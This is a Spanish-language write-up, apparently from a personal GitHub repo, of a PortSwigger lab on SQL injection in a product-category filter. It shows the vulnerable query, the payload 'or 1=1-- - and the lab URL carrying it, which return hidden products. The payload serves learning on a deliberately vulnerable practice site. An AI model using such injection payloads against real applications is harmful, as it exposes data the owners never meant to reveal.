# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

- [Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

## 

Descripción:

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

````sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
````

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

---

### Explicación:

El payload se inyecta en donde se pone el nombre del artículo o sección

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/0b35f1ca-3c73-4837-a0f8-b5be87e084bf)

Por ejemplo en una base de datos el query se vería similar a esto: 

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/c4e14787-7ed5-4ce9-b060-427c3c66f574)

En la vida real se vería más similar a esto, en lugar de usar en `*`

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/837008ac-50fd-452b-86ff-5e0881daed0d)

Debido a que el valor del nombre es donde yo puedo inyectar strings, es aquí donde debo poner el payload, en este caso quedaría:

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/b0dfe131-415e-4d63-afea-1c43853733e0)

- OJO! en consola se deben poner los `;`

## Solución:

1. Abrir laboratorio

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/a56c4773-50c8-41b7-82b7-94631079ad1c)

2. Si filtro puedo empezar a ver el query desde la URL

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/4349813d-9f17-4542-9695-ed2d23113a01)

3. Query que usé

````sql
'or 1=1-- -
````
````http
https://0adf002604af55028177ed87004400b4.web-security-academy.net/filter?category=Lifestyle'or 1=1-- -
````

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/22e3492e-a7c7-4573-a966-73830aa681fe)



